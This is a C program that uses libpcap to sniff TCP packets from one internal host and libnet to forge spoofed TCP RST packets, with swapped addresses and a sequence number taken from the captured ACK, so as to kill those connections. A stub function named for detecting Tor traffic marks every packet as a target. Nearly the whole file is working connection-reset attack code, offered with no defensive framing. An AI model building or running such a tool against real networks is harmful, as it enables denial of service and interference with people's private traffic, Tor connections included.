//
// Created by root on 2019/11/22.
//

#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <libnet.h>
#include <netinet/ip.h>

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
    u_char ip_vhl;		/* version << 4 | header length >> 2 */
    u_char ip_tos;		/* type of service */
    u_short ip_len;		/* total length */
    u_short ip_id;		/* identification */
    u_short ip_off;		/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* dont fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
    u_char ip_ttl;		/* time to live */
    u_char ip_p;		/* protocol */
    u_short ip_sum;		/* checksum */
    struct in_addr ip_src,ip_dst; /* source and dest address */
};

#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

/* TCP header */
struct sniff_tcp {
    u_short th_sport;	/* source port */
    u_short th_dport;	/* destination port */
    tcp_seq th_seq;		/* sequence number */
    tcp_seq th_ack;		/* acknowledgement number */

    u_char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;		/* window */
    u_short th_sum;		/* checksum */
    u_short th_urp;		/* urgent pointer */
};

struct ip_data{
    struct in_addr ip_src;
    struct in_addr ip_dst;
};

struct tcp_data{
    u_short port_src;
    u_short port_dst;
    uint32_t seq;
    uint16_t win;
};

struct ethernet_data{
    u_char mac_src[ETHER_ADDR_LEN];
    u_char mac_dst[ETHER_ADDR_LEN];
};


#define DEBUG
#define SIZE_ETHERNET 14

int isTorTraff(u_short *packet)
{
    return 1;
}

int buildRstPacket(struct ip_data *ip, struct tcp_data *tcp, struct ethernet_data *ether)
{
    int c ;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char *payload = "wdnmd";
    u_char HostAddr[255],MyAddr[255];
    u_short payload_s;
    u_long src_ip,dst_ip;
    u_short src_prt,dst_prt;
    char *src_char_ip, *dst_char_ip;

    char errbuf[LIBNET_ERRBUF_SIZE];

    l=libnet_init( LIBNET_RAW4,NULL,errbuf);
    if(l==NULL)
    {
        printf("libnet failed: %s",errbuf);
        exit(EXIT_FAILURE);
    }


    src_char_ip = inet_ntoa(ip->ip_src);
    dst_char_ip = inet_ntoa(ip->ip_dst);

    dst_prt = ntohs(tcp->port_dst);
    src_prt = ntohs(tcp->port_src);

    t=libnet_build_tcp_options("\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",20,l,0);
    if(t==-1)
    {printf("cant build TCP options: %s\n",libnet_geterror(l));
        goto bad;}

    payload_s = strlen(payload);

    t=libnet_build_tcp(src_prt,dst_prt,tcp->seq,0,TH_RST,tcp->win,0,10,
                     LIBNET_TCP_H+20+payload_s,(uint8_t *)payload,payload_s,l,0 );
    //t=libnet_build_tcp(src_port_test,dst_port_test,tcp->seq,0x02020202,TH_RST,tcp->win,0,10,
    //                   LIBNET_TCP_H + 20 + payload_s,(uint8_t *)payload,payload_s,l,0 );
    if(t==-1)
    {
        printf("cant build TCP header:%s\n",libnet_geterror(l));
        goto bad;
    }

    t=libnet_build_ipv4(LIBNET_IPV4_H+LIBNET_TCP_H+20+payload_s,0,242,0,64,IPPROTO_TCP,0, ip->ip_src.s_addr, ip->ip_dst.s_addr,NULL,0,l,0);

    if(t==-1)
    {
        printf("cant build IP header:%s\n",libnet_geterror(l));
        goto bad;
    }

    c=libnet_write(l);
    if(c==-1)
    {
        printf("write error:%s\n",libnet_geterror(l));
        goto bad;
    }
    else
    {
#ifdef DEBUG
        printf("--------packet info--------\n");
        printf("src ip:%s\n", src_char_ip);
        printf("dst ip:%s\n", dst_char_ip);
        printf("src port:%d\n"
               "des port:%d\n",  ntohs(tcp->port_src), ntohs(tcp->port_dst));
        printf("tcp seq:%u\n", tcp->seq);
        printf("tcp window:%hu\n", tcp->win);
#endif
        printf("wrote %d byte TCP packet\n",c);
    }
    libnet_destroy(l);
    return 1;

    bad:
    libnet_destroy(l);
    return 0;

}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

    const struct sniff_ethernet *ethernet; /* The ethernet header */
    const struct sniff_ip *ip; /* The IP header */
    const struct sniff_tcp *tcp; /* The TCP header */
    const char *payload; /* Packet payload */

    struct ip_data *ip_d;
    struct tcp_data *tcp_d;
    struct ethernet_data *ether_d;

    u_int size_ip;
    u_int size_tcp;

    ip_d = (struct ip_data*)malloc(sizeof(struct ip_data));
    tcp_d = (struct tcp_data*)malloc(sizeof(struct tcp_data));
    ether_d = (struct ethernet_data*)malloc(sizeof(struct ethernet_data));

    ethernet = (struct sniff_ethernet*)(packet);
    for (int i = 0; i < ETHER_ADDR_LEN; i++){
        ether_d->mac_src[i] = ethernet->ether_shost[i];
        ether_d->mac_dst[i] = ethernet->ether_dhost[i];
    }

#ifdef DEBUG
    //printf("ethernet src:%x");
    //printf("ethernet dst:%x");
#endif

    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }
    ip_d->ip_src = ip->ip_dst;
    ip_d->ip_dst = ip->ip_src;

#ifdef DEBUG
    printf("src ip:%s\n", inet_ntoa(ip->ip_src));
    printf("des ip:%s\n", inet_ntoa(ip->ip_dst));
#endif

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    if (!isTorTraff((u_short*)tcp)){
        return;
    }
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }

    tcp_d->port_src = tcp->th_dport;
    tcp_d->port_dst = tcp->th_sport;
    tcp_d->seq = ntohl(tcp->th_ack);
    tcp_d->win = ntohs(tcp->th_win);

#ifdef DEBUG
    printf("src port:%d\n"
           "des port:%d\n",  ntohs(tcp->th_sport), ntohs(tcp->th_dport));
    printf("tcp seq:%u\n", ntohl(tcp->th_seq));
    printf("tcp ack:%u\n", ntohl(tcp->th_ack));
    printf("tcp window:%hu\n", ntohs(tcp->th_win));
    printf("tcp seq should be (%u)\n", ntohl(tcp->th_ack));
#endif

    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    printf("payload:%s\n", payload);
    buildRstPacket(ip_d, tcp_d, ether_d);

}

int main(int argc, char *argv[])
{
    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program fp;
    char filter_exp[] = "(tcp[tcpflags] & (tcp-rst) == 0) and src host 10.59.13.159";
    bpf_u_int32 mask;
    bpf_u_int32 net;


    const struct sniff_ethernet *ethernet; /* The ethernet header */
    const struct sniff_ip *ip; /* The IP header */
    const struct sniff_tcp *tcp; /* The TCP header */
    const char *payload; /* Packet payload */

    u_int size_ip;
    u_int size_tcp;

    //
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }

#ifdef DEBUG
    printf("Device: %s\n", dev);
#endif

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Can't get netmask for device %s\n", dev);
        net = 0;
        mask = 0;
    }
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    for(int j = 1; j; j++)
    {
        printf("Time\n");
        printf("=================== packet catched =========================\n");
        pcap_loop(handle,1,got_packet,NULL); // 捕获并处理数据包.回调函数
        printf("=============================================================\n");
        sleep(1);
    }
    pcap_freealldevs(dev);  //free


    return(0);

}